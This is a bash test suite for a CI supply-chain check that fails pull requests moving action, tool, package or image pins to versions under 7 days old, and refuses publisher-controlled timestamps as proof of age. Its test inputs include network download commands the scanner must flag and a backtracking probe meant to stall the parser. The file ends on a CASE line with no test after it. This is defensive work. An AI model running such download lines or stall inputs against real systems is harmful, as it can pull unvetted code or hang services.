#!/usr/bin/env bash
# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3, REQ-SUP-001-AC16, REQ-SUP-001-AC18, REQ-SUP-001-AC19, REQ-SUP-001-AC20, REQ-SUP-001-AC21
# The pin age check (owner ratified Oct 5, rule 1; advisor 0172/0175): a pull request that moves an action pin, or the version of a tool, image or
# package a workflow downloads, fails unless that version has been public 7 days by a SERVER-SIDE time. Proved offline: each case builds a small git
# repository (a base commit and a head commit that moves one thing) and runs the real check against a fixtures file that stands in for the servers.
#   python3 bin/pin-age-check.py --root REPO --base REV --head REV --fixtures FILE [--json FILE] [--now ISO] [--min-days N]
#   exit 0: nothing moved, or every moved version is old enough; exit 1: a moved version is too young or its age cannot be proven.
#   An item is "<kind>:<name>@<version>"; kinds: action (version = the pinned commit), tool (the installer actions' version inputs and install-scanner.sh's
#   *_VER pins), gotool (go install path@version in run steps), package (pypi/<name>@<version> from the hash-pinned requirements), image (name@sha256:digest).
#   Fixtures: {"now": ISO, "times": {ITEM: {"time": ISO, "source": S}}, "first_seen": {ITEM: ISO}}. Sources that count: github-release, pypi, go-index,
#   registry-push. A source of commit-date, tag-date or image-config is NEVER a proof (the publisher or the builder controls it).
set -euo pipefail
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@x GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@x   # CI runners have no git identity
here=$(cd "$(dirname "$0")" && pwd)
root=$(cd "$here/../../.." && pwd)
chk="$here/../supply-chain/pin-age-check.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
ok()  { pass=$((pass+1)); echo "ok   $1"; }
bad() { failn=$((failn+1)); echo "FAIL $1"; }
CASE=""
check() { if "$@" >/dev/null 2>&1; then ok "$CASE"; else bad "$CASE"; fi; }
NOW="2026-10-05T12:00:00Z"
d() { python3 -c "import datetime,sys;print((datetime.datetime(2026,10,5,12)-datetime.timedelta(days=float(sys.argv[1]))).strftime('%Y-%m-%dT%H:%M:%SZ'))" "$1"; }
SHA1=$(printf '1%.0s' $(seq 40)); SHA2=$(printf '2%.0s' $(seq 40)); SHA3=$(printf '3%.0s' $(seq 40)); SHA4=$(printf '4%.0s' $(seq 40)); SHA5=$(printf '5%.0s' $(seq 40))
SHA6=$(printf '6%.0s' $(seq 40)); DIG4=sha256:$(printf '4%.0s' $(seq 64)); DIG5=sha256:$(printf '5%.0s' $(seq 64)); DIG1=sha256:$(printf '1%.0s' $(seq 64)); DIG2=sha256:$(printf '2%.0s' $(seq 64)); DIG3=sha256:$(printf '3%.0s' $(seq 64))

# --- the base repository: one of every kind of pin --------------------------------------------------------------------
base="$work/base"; mkdir -p "$base/.github/workflows" "$base/.github/actions/local" "$base/.github/pins" "$base/bin" "$base/build/docker"
cat >"$base/.github/workflows/ci.yml" <<EOF
on: pull_request
jobs:
  j:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/own/ci@$DIG1
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
      - uses: golangci/golangci-lint-action@$SHA2 # v9.3.0
        with:
          version: v2.13.2
      - uses: actions/setup-go@$SHA3 # v6.0.0
        with:
          go-version: '1.27'
      - uses: actions/setup-python@$SHA4 # v6.1.0
        with:
          python-version: '3.12'
      - run: |
          go install github.com/securego/gosec/v2/cmd/gosec@v2.29.0
          python3 -m pip install --require-hashes -r .github/pins/adjudicator-requirements.txt
      - uses: goreleaser/goreleaser-action@$SHA6 # v7.2.3
        with:
          version: '2.17.1'
      - uses: helm/kind-action@$SHA6 # v1.15.0
        with:
          node_image: kindest/node:v1.31.0@$DIG4
      - run: |
          curl -fsSL https://github.com/cli/cli/releases/download/v2.40.0/gh_2.40.0_linux_amd64.tar.gz -o gh.tgz
          python3 -m pip install --quiet black==24.1.0
          docker run --rm alpine:3.20@$DIG5 true
EOF
cat >"$base/.github/actions/local/action.yml" <<EOF
name: local
runs:
  using: composite
  steps:
    - uses: actions/cache@$SHA5 # v4.2.0
EOF
cat >"$base/bin/install-scanner.sh" <<'EOF'
#!/usr/bin/env bash
TRIVY_VER=0.74.0
GRYPE_VER=0.118.0
GITSIGN_VER=0.17.1
EOF
cat >"$base/.github/pins/adjudicator-requirements.txt" <<'EOF'
# hash-pinned
anthropic==1.9.0 \
    --hash=sha256:aaaa
requests==2.32.0 \
    --hash=sha256:bbbb
EOF
printf 'FROM gcr.io/distroless/static@%s\n' "$DIG2" >"$base/build/docker/Dockerfile.production"
printf 'module x\n\ngo 1.27\n\ntoolchain go1.27.1\n\nrequire github.com/foo/bar v1.0.0\n' >"$base/go.mod"
git -C "$base" init -q; git -C "$base" add -A; git -C "$base" -c user.name=t -c user.email=t@x commit -q -m base

# newcase NAME 'python edit run in the repo root' -> $work/NAME (a copy of base with a head commit)
newcase() {
  local n=$1; rm -rf "$work/$n"; cp -R "$base" "$work/$n"
  ( cd "$work/$n" && python3 - "$2" <<'PY'
import sys
exec(sys.argv[1])
PY
    git add -A; git -c user.name=t -c user.email=t@x commit -q -m head )
}
# runck NAME FIXTURES-JSON [extra args] -> sets rc, $work/NAME.out
runck() {
  local n=$1 fx=$2; shift 2; echo "$fx" >"$work/$n.fx.json"; rc=0
  python3 "$chk" --root "$work/$n" --base HEAD~1 --head HEAD --fixtures "$work/$n.fx.json" --now "$NOW" --json "$work/$n.json" "$@" >"$work/$n.out" 2>&1 || rc=$?
}
sub() { python3 -c "import sys;print('import pathlib; p=pathlib.Path(%r); p.write_text(p.read_text().replace(%r,%r))' % tuple(sys.argv[1:]))" "$@"; }
OLD=$(d 10); YOUNG=$(d 3)

# --- nothing moves ------------------------------------------------------------------------------------------------------
newcase none "pathlib=__import__('pathlib'); pathlib.Path('README.md').write_text('hi')"
runck none '{"times": {}}'
CASE="no pin moved: exit 0, says so, and needs no data at all"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/none.out"

# --- an action pin moves: AC2 names it, AC3 measures its age ---------------------------------------------------------------
NEW1=$(printf 'a%.0s' $(seq 40))
newcase act "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")"
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"observer\"}}}"
CASE="a moved action pin whose release is 10 days old passes, and the check NAMES it"
check test "$rc" -eq 0; check grep -q "action:actions/checkout@$NEW1" "$work/act.out"
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}}"
CASE="the same pin released 3 days ago FAILS (exit 1) and says how young it is"
check test "$rc" -eq 1; check grep -qi 'FAIL' "$work/act.out"; check grep -q "action:actions/checkout@$NEW1" "$work/act.out"
runck act '{"times": {}}'
CASE="a moved pin with no age data FAILS: age not provable is a failure, never a pass"
check test "$rc" -eq 1; check grep -qi 'not provable\|cannot prove\|unprovable' "$work/act.out"
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"github-release\"}}}"
CASE="a RELEASE date alone never proves an action (a tag can be moved under an old release): fails, though a tool's release date still counts"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"commit-date\"}}}"
CASE="a COMMIT date is never a proof of age (the publisher controls it): fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"tag-date\"}}}"
CASE="a TAG date is never a proof either: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$YOUNG\", \"source\": \"observer\"}}, \"first_seen\": {\"action:actions/checkout@$NEW1\": \"$OLD\"}}"
CASE="when the release is young but the exact version first appeared in one of OUR pull requests 10 days ago, it passes (the third server-side source)"
check test "$rc" -eq 0
runck act "{\"times\": {}, \"first_seen\": {\"action:actions/checkout@$NEW1\": \"$YOUNG\"}}"
CASE="first seen in our own PR only 3 days ago: still too young, fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$(d 7)\", \"source\": \"observer\"}}}"
CASE="exactly 7 days old passes (the boundary is 7 days, not 7 days and a minute)"
check test "$rc" -eq 0
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$(d 6.99)\", \"source\": \"observer\"}}}"
CASE="just under 7 days old fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"2099-01-01T00:00:00Z\", \"source\": \"observer\"}}}"
CASE="a publish time in the FUTURE is not a proof: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"not a date\", \"source\": \"observer\"}}}"
CASE="an unparseable time is unprovable: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"made-up\"}}}"
CASE="a source the check does not know is not a proof: fails"
check test "$rc" -eq 1
runck act "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"observer\"}}}" --min-days 30
CASE="--min-days is honoured (a 10-day-old version fails a 30-day rule)"
check test "$rc" -eq 1

# --- every other kind of pin the age check covers (AC2) ---------------------------------------------------------------------
cover() { # <name> <edit> <item key> <source>
  newcase "$1" "$2"
  runck "$1" "{\"times\": {\"$3\": {\"time\": \"$OLD\", \"source\": \"$4\"}}}"
  CASE="$1: moved, named and (10 days old via $4) accepted"; check test "$rc" -eq 0; check grep -qF "$3" "$work/$1.out"
  runck "$1" "{\"times\": {\"$3\": {\"time\": \"$YOUNG\", \"source\": \"$4\"}}}"
  CASE="$1: the same item 3 days old fails"; check test "$rc" -eq 1
  runck "$1" '{"times": {}}'
  CASE="$1: with no age data fails"; check test "$rc" -eq 1
}
cover tool-scanner "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')" "tool:trivy@0.75.0" github-release
cover tool-gitsign "$(sub bin/install-scanner.sh 'GITSIGN_VER=0.17.1' 'GITSIGN_VER=0.18.0')" "tool:gitsign@0.18.0" github-release
cover tool-installer-input "$(sub .github/workflows/ci.yml 'version: v2.13.2' 'version: v2.14.0')" "tool:golangci-lint@v2.14.0" github-release
cover tool-python-version "$(sub .github/workflows/ci.yml "python-version: '3.12'" "python-version: '3.13.1'")" "tool:python@3.13.1" github-release
cover gotool "$(sub .github/workflows/ci.yml 'gosec@v2.29.0' 'gosec@v2.30.0')" "gotool:github.com/securego/gosec/v2/cmd/gosec@v2.30.0" go-index
cover package "$(sub .github/pins/adjudicator-requirements.txt 'anthropic==1.9.0' 'anthropic==1.10.0')" "package:pypi/anthropic@1.10.0" pypi
cover image-container "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci@$DIG3")" "image:ghcr.io/own/ci@$DIG3" registry-push
cover tool-goreleaser "$(sub .github/workflows/ci.yml "version: '2.17.1'" "version: '2.18.0'")" "tool:goreleaser@2.18.0" github-release
cover tool-curl-download "$(sub .github/workflows/ci.yml 'releases/download/v2.40.0/gh_2.40.0_linux_amd64' 'releases/download/v2.41.0/gh_2.41.0_linux_amd64')" "tool:cli/cli/gh_2.41.0_linux_amd64.tar.gz@v2.41.0" github-release
cover package-in-run-step "$(sub .github/workflows/ci.yml 'black==24.1.0' 'black==24.2.0')" "package:pypi/black@24.2.0" pypi
cover image-in-run-step "$(sub .github/workflows/ci.yml "alpine:3.20@$DIG5" "alpine:3.20@$DIG3")" "image:alpine@$DIG3" registry-push
cover image-installer-input "$(sub .github/workflows/ci.yml "kindest/node:v1.31.0@$DIG4" "kindest/node:v1.31.0@$DIG3")" "image:kindest/node@$DIG3" registry-push
NEW5=$(printf 'b%.0s' $(seq 40))
cover local-composite-action "$(sub .github/actions/local/action.yml "actions/cache@$SHA5" "actions/cache@$NEW5")" "action:actions/cache@$NEW5" observer

# --- a go install tool: the module INDEX's time, never the version-control time -------------------------------------------------
runck gotool "{\"times\": {\"gotool:github.com/securego/gosec/v2/cmd/gosec@v2.30.0\": {\"time\": \"$OLD\", \"source\": \"vcs-time\"}}}"
CASE="a go install tool's age from the version-control .info time is refused (the index timestamp is the server-side one): fails"
check test "$rc" -eq 1
# --- an image: the registry's push time, never the image's own created field ----------------------------------------------------
runck image-container "{\"times\": {\"image:ghcr.io/own/ci@$DIG3\": {\"time\": \"$OLD\", \"source\": \"image-config\"}}}"
CASE="an image's own 'created' field is refused (the builder sets it): fails"
check test "$rc" -eq 1

# --- name:tag@sha256:digest counts as PINNED (Docker ignores the tag when a digest is present): the image is the name without the tag, the version the digest ----
newcase tagdigest "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2@$DIG3")"
runck tagdigest "{\"times\": {\"image:ghcr.io/own/ci@$DIG3\": {\"time\": \"$OLD\", \"source\": \"registry-push\"}}}"
CASE="an image written name:tag@sha256:digest is the SAME item as name@sha256:digest (the tag is ignored): moved, named by its digest, and accepted at 10 days"
check test "$rc" -eq 0; check grep -qF "image:ghcr.io/own/ci@$DIG3" "$work/tagdigest.out"
newcase tagonly "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2")"
runck tagonly '{"times": {}}'
CASE="an image with only a tag (no digest) is not a pin the age check can measure: it fails rather than passing silently"
check test "$rc" -eq 1

# --- NOT covered: the product's base image, Go modules, the Go toolchain (amendments 1 and 2) -------------------------------------
newcase notcovered "$(sub build/docker/Dockerfile.production "$DIG2" "$DIG3")
$(sub go.mod 'go1.27.1' 'go1.27.2')
$(sub .github/workflows/ci.yml "go-version: '1.27'" "go-version: '1.28'")
$(sub go.mod 'v1.0.0' 'v1.1.0')"
runck notcovered '{"times": {}}'
CASE="the product base image, a Go module bump, go.mod's toolchain and setup-go's version are NOT covered: they move with no data and no failure"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/notcovered.out"

# --- several moves: every one is named, one young one fails the whole check ---------------------------------------------------------
newcase multi "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')
$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' 'requests==2.33.0')"
runck multi "{\"times\": {\"action:actions/checkout@$NEW1\": {\"time\": \"$OLD\", \"source\": \"observer\"}, \"tool:trivy@0.75.0\": {\"time\": \"$YOUNG\", \"source\": \"github-release\"}, \"package:pypi/requests@2.33.0\": {\"time\": \"$OLD\", \"source\": \"pypi\"}}}"
CASE="three moves, one of them 3 days old: exit 1, and the output names ALL THREE (so a reviewer sees what moved) and blames the young one"
check test "$rc" -eq 1
check grep -qF "action:actions/checkout@$NEW1" "$work/multi.out"; check grep -qF "tool:trivy@0.75.0" "$work/multi.out"; check grep -qF "package:pypi/requests@2.33.0" "$work/multi.out"
check python3 - "$work/multi.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
moved = {m["item"]: m for m in d["moved"]}
assert set(moved) == {"action:actions/checkout@" + "a" * 40, "tool:trivy@0.75.0", "package:pypi/requests@2.33.0"}, sorted(moved)
assert moved["tool:trivy@0.75.0"]["ok"] is False and moved["package:pypi/requests@2.33.0"]["ok"] is True, moved
PY

# --- a NEW pin counts as moved; a removed pin is no age problem --------------------------------------------------------------
NEW6=$(printf 'c%.0s' $(seq 40))
newcase added "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "      - uses: actions/checkout@$SHA1 # v4.1.0"$'\n'"      - uses: actions/upload-artifact@$NEW6 # v7.0.1")"
runck added '{"times": {}}'
CASE="a brand-new action pin counts as moved: with no age data it fails"
check test "$rc" -eq 1; check grep -qF "action:actions/upload-artifact@$NEW6" "$work/added.out"
newcase removed "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "")"
runck removed '{"times": {}}'
CASE="removing a pin is not an age problem: exit 0"
check test "$rc" -eq 0

# --- a moved pin whose version is the SAME item elsewhere (the same commit used twice) is judged once, and an UNCHANGED pin never needs data ----------
runck none '{"times": {}}'
CASE="an unchanged workflow with 5 pins needs no data (only what MOVED is measured)"
check test "$rc" -eq 0

# --- a workflow whose filename is not ASCII is still read (git quotes such paths; a pin there must never go unmeasured) --------------------------------------------
newcase unicode "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
import pathlib, shutil
shutil.copy('.github/workflows/ci.yml', '.github/workflows/\u00e9.yml')
pathlib.Path('.github/workflows/ci.yml').write_text(pathlib.Path('.github/workflows/ci.yml').read_text().replace('actions/checkout@$NEW1', 'actions/checkout@$SHA1'))"
runck unicode '{"times": {}}'
CASE="a new pin in .github/workflows/\u00e9.yml (a non-ASCII file name) is named and measured like any other"
check test "$rc" -eq 1; check grep -qF "action:actions/checkout@$NEW1" "$work/unicode.out"

# --- the age of an ACTION's exact commit: our own scheduled observer first saw the tag at it, or the PR clock; a release date proves nothing (advisor 0183) -----------------------------------------
stubpy="$here/gh-map-stub.py"
mkstate() { # <state json> -> a zip holding state.json, base64
  python3 -c "import base64,io,json,sys,zipfile;b=io.BytesIO();z=zipfile.ZipFile(b,'w');z.writestr('state.json',sys.argv[1]);z.close();print(base64.b64encode(b.getvalue()).decode())" "$1"
}
ACTR=o/act
liveproof() { # <state or ->  <run event>  <label>  -> prints the live_proofs list for action o/act@$SHA1
  local state=$1 event=$2 label=${3:-v4.1.0}
  python3 - "$work/map.json" "$state" "$event" "$SHA1" "$(d 8)" <<'PY'
import base64, io, json, sys, zipfile
m = {}
if sys.argv[2] != "-":
    b = io.BytesIO(); z = zipfile.ZipFile(b, "w"); z.writestr("state.json", sys.argv[2]); z.close()
    m["repos/o/r/actions/workflows/supply-chain.yml/runs?event=schedule&branch=main&status=completed&per_page=100"] = {"workflow_runs": [{"id": 7, "event": sys.argv[3], "head_branch": "main", "conclusion": "success", "path": ".github/workflows/supply-chain.yml", "created_at": sys.argv[5]}]}
    m["repos/o/r/actions/runs/7/artifacts"] = {"artifacts": [{"id": 9, "name": "tag-observations", "expired": False}]}
    m["repos/o/r/actions/artifacts/9/zip"] = {"__b64": base64.b64encode(b.getvalue()).decode()}
json.dump(m, open(sys.argv[1], "w"))
PY
  ( cd "$work" && GITHUB_REPOSITORY=o/r GH_MAP="$work/map.json" python3 - "$chk" "$SHA1" "$stubpy" "$label" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
orig = subprocess.run
def run(cmd, *a, **k):
    if cmd and cmd[0] == "gh": cmd = [sys.argv[3], *cmd[1:]]
    return orig(cmd, *a, **k)
subprocess.run = run
ac._tag_refs = lambda repo: {"v4": sys.argv[2], "v4.1.0": sys.argv[2]}
try:
    print(ac.live_proofs(ac.inv.Item("action", "o/act", sys.argv[2], sys.argv[4]), "."))
except ac.CouldNotLook as e:
    print("COULDNOTLOOK", e)
PY
) 2>&1 | tail -1; }
GOODSTATE=$(python3 -c "import json,sys;print(json.dumps({'version':1,'first_seen':{'o/act@v4.1.0@'+sys.argv[1]:'2026-09-01T00:00:00Z'}}))" "$SHA1")
out=$(liveproof "$GOODSTATE" schedule)
CASE="observer: our scheduled run first saw v4.1.0 at the pinned commit on 2026-09-01: an observer proof with that time"
case "$out" in *"2026-09-01T00:00:00Z', 'observer'"*) ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof "$GOODSTATE" push)
CASE="observer: a run that is not event=schedule is never read (a PR cannot forge the state): no proof"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
MOVED=$(python3 -c "import json;print(json.dumps({'version':1,'first_seen':{'o/act@v4.1.0@'+'e'*40:'2026-01-01T00:00:00Z'}}))")
out=$(liveproof "$MOVED" schedule)
CASE="observer: the tag was seen on 2026-01-01 at a DIFFERENT commit; its move to the pinned commit was never observed: no proof (the tj-actions pattern)"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof "$GOODSTATE" schedule v9.9.9)
CASE="observer: the # version label must itself resolve to the pinned commit (v9.9.9 does not): no proof"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof - schedule)
CASE="observer: no scheduled run has produced state yet: nothing observed, no proof, and no error (ages only get younger)"
case "$out" in "[]") ok "$CASE";; *) bad "$CASE ($out)";; esac
out=$(liveproof "not json" schedule)
CASE="observer: a state that exists but cannot be read is loud (could not look), never 'nothing observed'"
case "$out" in COULDNOTLOOK*) ok "$CASE";; *) bad "$CASE ($out)";; esac

# --- the PR clock: the first workflow run on the commit that INTRODUCED the version in this PR (server-side), never a PR's creation time or text -----------------------------------------------
rm -rf "$work/pc"; mkdir -p "$work/pc/.github/workflows"; git -C "$work/pc" init -q
gc() { git -C "$work/pc" add -A; git -C "$work/pc" -c user.name=t -c user.email=t@x commit -q -m "$1"; }
printf 'on: x\njobs:\n  j:\n    steps:\n      - run: echo hi\n' >"$work/pc/.github/workflows/a.yml"; gc base
printf 'on: x\n# 21 21 21 mentioned in a comment\njobs:\n  j:\n    steps:\n      - run: echo hi\n' >"$work/pc/.github/workflows/a.yml"; gc decoy
printf 'on: x\njobs:\n  j:\n    steps:\n      - run: echo hi\n      - uses: actions/setup-java@%s # v5\n        with:\n          java-version: 21\n' "$SHA6" >"$work/pc/.github/workflows/a.yml"; gc introduce
printf '# later\n' >>"$work/pc/.github/workflows/a.yml"; gc later
BASEC=$(git -C "$work/pc" rev-parse HEAD~3); DECOY=$(git -C "$work/pc" rev-parse HEAD~2); INTRO=$(git -C "$work/pc" rev-parse HEAD~1); HEADC=$(git -C "$work/pc" rev-parse HEAD)
pcclock() { # <runs json for the introducing commit or ->
  python3 - "$work/map.json" "$INTRO" "$HEADC" "$1" "$DECOY" <<'PY'
import json, sys
m = {"repos/o/r/actions/runs?head_sha=" + sys.argv[3] + "&per_page=100": {"workflow_runs": [{"created_at": "2026-10-04T00:00:00Z"}]},
     "repos/o/r/actions/runs?head_sha=" + sys.argv[5] + "&per_page=100": {"workflow_runs": [{"created_at": "2026-09-01T00:00:00Z"}]}}
if sys.argv[4] != "-":
    m["repos/o/r/actions/runs?head_sha=" + sys.argv[2] + "&per_page=100"] = {"workflow_runs": json.loads(sys.argv[4])}
json.dump(m, open(sys.argv[1], "w"))
PY
  ( cd "$work" && GITHUB_REPOSITORY=o/r GH_MAP="$work/map.json" python3 - "$chk" "$stubpy" "$work/pc" "$BASEC" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
orig = subprocess.run
def run(cmd, *a, **k):
    if cmd and cmd[0] == "gh": cmd = [sys.argv[2], *cmd[1:]]
    return orig(cmd, *a, **k)
subprocess.run = run
print(ac._pr_clock(ac.inv.Item("tool", "java", "21"), sys.argv[3], sys.argv[4], "HEAD"))
PY
) 2>&1 | tail -1; }
CASE="PR clock: the earliest workflow run on the first commit whose INVENTORY holds the item (not on an earlier commit that merely mentions 21 in a comment, nor the later head)"
check test "$(pcclock '[{"created_at":"2026-09-20T00:00:00Z"},{"created_at":"2026-09-25T00:00:00Z"}]')" = 2026-09-20T00:00:00Z
CASE="PR clock: no run on the introducing commit means no clock (the later commit's runs do not count)"
check test "$(pcclock -)" = None
CASE="PR clock: outside a PR (no base) there is no clock"
check test "$(cd "$work" && GITHUB_REPOSITORY=o/r python3 - "$chk" "$work/pc" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
print(ac._pr_clock(ac.inv.Item("tool", "java", "21"), sys.argv[2], None))
PY
)" = None

# --- tools: the NEWEST of the release date and every asset's own created/updated time; PyPI: the newest file ------------------------------------------------------------------------------------
CASE="a tool's release proof is the newest asset time: an asset replaced yesterday in an old release is young again"
check python3 - "$chk" "$stubpy" "$work" <<'PY'
import importlib.util, json, os, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
json.dump({"repos/aquasecurity/trivy/releases/tags/0.75.0": {"message": "x"}, "repos/aquasecurity/trivy/releases/tags/v0.75.0": {"published_at": "2026-01-01T00:00:00Z", "draft": False,
           "assets": [{"created_at": "2026-01-01T00:00:00Z", "updated_at": "2026-10-04T00:00:00Z"}]}}, open(sys.argv[3] + "/map.json", "w"))
os.environ["GH_MAP"] = sys.argv[3] + "/map.json"
orig = subprocess.run
subprocess.run = lambda cmd, *a, **k: orig([sys.argv[2], *cmd[1:]] if cmd and cmd[0] == "gh" else cmd, *a, **k)
ac._OBS.clear()
got = ac.live_proofs(ac.inv.Item("tool", "trivy", "0.75.0"), ".")
assert got == [("2026-10-04T00:00:00Z", "github-release")], got
PY


# --- plain forms from review round 3: pip extras and operators, an indented requirements line, a tag-only docker run, an expression that holds `|`, an action's subdirectory -----------------------------------
newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 urllib3>=2.0\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
runck extras '{"times": {}}'
CASE="pip extras (requests[socks]==2.99.0), a range (urllib3>=2.0), a tag-only docker run image and an expression containing || are all inventory items; the expression's secret name never prints"
check test "$rc" -eq 1; check grep -qF "package:pypi/requests@2.99.0" "$work/extras.out"; check grep -qF "package:pypi/urllib3@>=2.0" "$work/extras.out"; check grep -qF "image:alpine:3.99@" "$work/extras.out"
check bash -c "! grep -rq PRIVATE_VERSION '$work/extras.out' '$work/extras.json'"; check grep -qF 'gotool:example.org/tool@${{expression}}' "$work/extras.out"
newcase subdir "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/init@'$SHA6$' # v3\n      - run: |')"
git -C "$work/subdir" commit -q --amend -m head
newcase subdir2 "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/analyze@'$SHA6$' # v3\n      - run: |')"
runck subdir2 '{"times": {}}'
CASE="an action's subdirectory is part of its identity: github/codeql-action/analyze@sha is named as such"
check test "$rc" -eq 1; check grep -qF "action:github/codeql-action/analyze@$SHA6" "$work/subdir2.out"
newcase indentreq "$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' '  requests[security]==2.40.0')"
runck indentreq '{"times": {}}'
CASE="an indented requirements line and a requirement with extras are read"
check test "$rc" -eq 1; check grep -qF "package:pypi/requests@2.40.0" "$work/indentreq.out"

# --- a hostile line cannot stall the readers; the scout versions named in install-scanner.sh; forms this inventory does not measure are listed, never silently empty ---------------------------------
CASE="inventory: a run line of 200 repeated expressions (a pattern-backtracking probe) is read in well under a second"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.time()
for body in ("curl https://github.com/a/b/releases/download/v" + "${{ x }}" * 200, "go install example.org/t@" + "${{ x }}" * 200, "pip install foo==" + "${{ x }}" * 200):
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + body + "\n"})
try:
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})
except RuntimeError as e:
    assert "refusing to read it partially" in str(e)
else:
    raise AssertionError("an over-long command line was read as its prefix")
assert time.time() - t < 3, time.time() - t
PY
CASE="inventory: docker-scout-X.Y.Z versions in install-scanner.sh's case list are tool:scout items; releases/latest/download is an unprovable item; go run and go get x@v are go tools"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/install-scanner.sh": "SCOUT_VER=1.26.0\ncase x in docker-scout|docker-scout-1.25.0|docker-scout-1.24.0) ;; esac\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/latest/download/x.tgz\n          go run example.org/tool@v1.2.3\n          go get example.org/other@v2.0.0\n"})
for k in ("tool:scout@1.25.0", "tool:scout@1.24.0", "tool:scout@1.26.0", "tool:o/r@latest", "gotool:example.org/tool@v1.2.3", "gotool:example.org/other@v2.0.0"):
    assert k in got, (k, sorted(got))
PY
CASE="inventory: install forms it does not measure (npm, apt, gh release download, a pip URL, a non-release download) are LISTED"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
f = {".github/workflows/a.yml": "x: npm install left-pad\ny: sudo apt-get install -y skopeo\nz: gh release download v1\nw: pip install git+https://x/y@z\nv: curl -O https://example.org/t.tgz\n"}
whats = {k[1] for k in inv.unmeasured(f)}
assert whats == {"a package-manager install", "a system package install", "a gh release or extension download", "a pip install from a URL", "a download"}, whats
PY

CASE="inventory: docker run with a quoted image, with --cpus 2, and bare pip install names are items; a range, (unpinned) or an expression is NEVER a pin that can pass the age check"
